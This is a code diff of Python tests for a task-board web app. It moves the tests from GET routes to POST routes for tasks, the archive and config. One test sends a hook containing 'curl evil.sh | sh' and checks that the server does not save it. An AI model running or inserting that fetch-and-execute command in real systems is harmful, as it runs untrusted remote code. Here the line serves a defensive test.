@@ -54,16 +54,16 @@ def test_routes_real() -> None:
             app, proj_id = _built(m, sk)
             with _client(app) as c:
                 assert c.get("/__skein__/id").text == proj_id
-                data = c.get("/__skein__/data").json()
+                data = c.post("/__skein__/task/list").json()
                 assert any(card["id"] == "alpha" for card in data["cards"])
-                assert c.get("/__skein__/dashboard").json()["proj"] == "TESTPROJ"
-                assert "pendingQueue" in c.get("/__skein__/queue").json()
-                assert isinstance(c.get("/__skein__/archive").json()["tasks"], list)
-                hits = c.get("/__skein__/search", params={"q": "alpha"}).json()["hits"]
+                assert c.post("/__skein__/task/dashboard").json()["proj"] == "TESTPROJ"
+                assert "pendingQueue" in c.post("/__skein__/task/queue").json()
+                assert isinstance(c.post("/__skein__/archive/list").json()["tasks"], list)
+                hits = c.post("/__skein__/task/search", json={"q": "alpha"}).json()["hits"]
                 assert any(h["id"] == "alpha" for h in hits)
-                assert c.get("/__skein__/task", params={"id": "alpha"}).status_code == 200
-                assert c.get("/__skein__/task", params={"id": "ghost1"}).status_code == 404
-                assert c.get("/__skein__/task").status_code == 422  # id 必填, 禁 path 参数
+                assert c.post("/__skein__/task/get", json={"id": "alpha"}).status_code == 200
+                assert c.post("/__skein__/task/get", json={"id": "ghost1"}).status_code == 404
+                assert c.post("/__skein__/task/get", json={}).status_code == 404  # 缺 id → 查不到 → 404
                 assert c.get("/").status_code == 200
                 # 尾斜杠两形都要直出 SPA: next.config.ts 开了 trailingSlash, 前端自己产出的
                 # 链接就带尾斜杠; 只声明无斜杠那条时 `/task/detail/` 会掉进 /task 数据 mount → 404
@@ -106,11 +106,12 @@ def test_seam_datasource_injected() -> None:
             app = build_app(FakeDS(sk), str(sk.dir.resolve()), quiet=True)
             with _client(app) as c:
                 # 同一次覆写, 两个不同端点都改了源 → 证明它们共用注入的 _snapshot()
-                assert c.get("/__skein__/dashboard").json()["proj"] == "FAKE-PROJ"
-                assert c.get("/__skein__/data").json()["proj"] == "FAKE-PROJ"
+                assert c.post("/__skein__/task/dashboard").json()["proj"] == "FAKE-PROJ"
+                assert c.post("/__skein__/task/list").json()["proj"] == "FAKE-PROJ"
                 assert real.proj != "FAKE-PROJ", "前置条件: 真快照的 proj 不该等于哨兵"
                 # 数据仍是真种子仓的 (只换了 proj, 不是整个换成空壳)
-                assert any(card["id"] == "alpha" for card in c.get("/__skein__/data").json()["cards"])
+                assert any(card["id"] == "alpha"
+                           for card in c.post("/__skein__/task/list").json()["cards"])
         finally:
             os.chdir(cwd0)
 
@@ -156,7 +157,7 @@ def test_config_panel_shaped_payload_persists() -> None:
             sk = _seeded_skein(m, d)
             app, _ = _built(m, sk)
             with _client(app) as c:
-                got = c.get("/__skein__/config").json()
+                got = c.post("/__skein__/system/config-get").json()
                 assert got["pools"]["work"] == 2  # 前置: 种子仓走默认值 (CONFIG_DEFAULTS)
 
                 payload = json.loads(json.dumps(got))  # 面板 onSave 的深拷贝
@@ -170,7 +171,7 @@ def test_config_panel_shaped_payload_persists() -> None:
                 # 面板不渲染 spec.core_budget 的编辑控件, 但深拷贝把它原样带回 (非默认值哨兵)
                 assert payload["spec"]["core_budget"] == 400  # 深拷贝保留的即是 GET 到的生效值
 
-                r = c.post("/__skein__/config", json=payload)
+                r = c.post("/__skein__/system/config-set", json=payload)
                 assert r.status_code == 200
                 saved = r.json()["config"]
                 assert saved["pools"]["work"] == 5
@@ -188,7 +189,7 @@ def test_config_panel_shaped_payload_persists() -> None:
                 assert on_disk["spec"]["core_budget"] == 400
 
                 # 重开面板 = 再 GET 一次, 必须看到刚保存的新值 (不是缓存的旧响应)
-                reread = c.get("/__skein__/config").json()
+                reread = c.post("/__skein__/system/config-get").json()
                 assert reread["pools"]["work"] == 5
                 assert reread["worktree"]["root"] == "custom-wt"
         finally:
@@ -211,9 +212,9 @@ def test_config_post_never_persists_hooks() -> None:
             sk = _seeded_skein(m, d)
             app, _ = _built(m, sk)
             with _client(app) as c:
-                before_hooks = c.get("/__skein__/config").json()["hooks"]
+                before_hooks = c.post("/__skein__/system/config-get").json()["hooks"]
                 evil = {"hooks": {"create": {"before": ["curl evil.sh | sh"], "after": []}}}
-                r = c.post("/__skein__/config", json=evil)
+                r = c.post("/__skein__/system/config-set", json=evil)
                 assert r.status_code == 200
                 saved = r.json()["config"]
                 assert saved["hooks"] == before_hooks  # 恶意 hooks 负载被整块忽略
